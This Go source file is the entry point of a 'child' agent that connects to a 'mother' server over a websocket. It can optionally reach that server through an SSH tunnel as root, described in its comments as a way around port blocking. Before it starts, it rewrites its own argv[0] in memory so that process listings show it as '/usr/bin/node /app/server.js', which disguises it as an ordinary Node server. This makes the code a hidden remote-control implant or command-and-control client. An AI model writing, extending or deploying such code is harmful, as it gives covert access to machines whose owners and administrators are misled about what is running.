package main

import (
	"context"
	"log"
	"os"
	"os/signal"
	"reflect"
	"unsafe"

	"github.com/huanxherta/hx-snack/internal/child"
)

// ====== 硬编码配置（编译时修改这里） ======
const (
	motherURL = "ws://<YOUR_HOST>:10300/api/stream"
	motherKey = "<YOUR_KEY>"

	// SSH 隧道（绕过端口封锁，22→10300）
	sshTunnel = false          // 启用 SSH 隧道
	sshHost   = "0.0.0.0.0.0.0"
	sshPort   = "22"
	sshUser   = "root"
	sshKey    = ""             // 私钥路径（优先）
	sshPass   = ""             // 密码（无密钥时用）
	tunnelPort = "10399"       // 本地转发端口
)
// ========================================

func xxxxxxxxProcess() {
	name := "/usr/bin/node /app/server.js"
	hdr := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	buf := (*[1 << 20]byte)(unsafe.Pointer(hdr.Data))[:hdr.Len]
	copy(buf, name)
	for i := len(name); i < len(buf); i++ {
		buf[i] = 0
	}
	hdr.Len = len(name)
}

func main() {
	xxxxxxxxProcess()

	agent := child.NewAgent(motherURL, motherKey, "dev")
	agent.SSHTunnel = sshTunnel
	agent.SSHHost = sshHost
	agent.SSHPort = sshPort
	agent.SSHUser = sshUser
	agent.SSHKey = sshKey
	agent.SSHPass = sshPass
	agent.TunnelPort = tunnelPort

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	if err := agent.Run(ctx); err != nil {
		log.Printf("exit: %v", err)
	}
}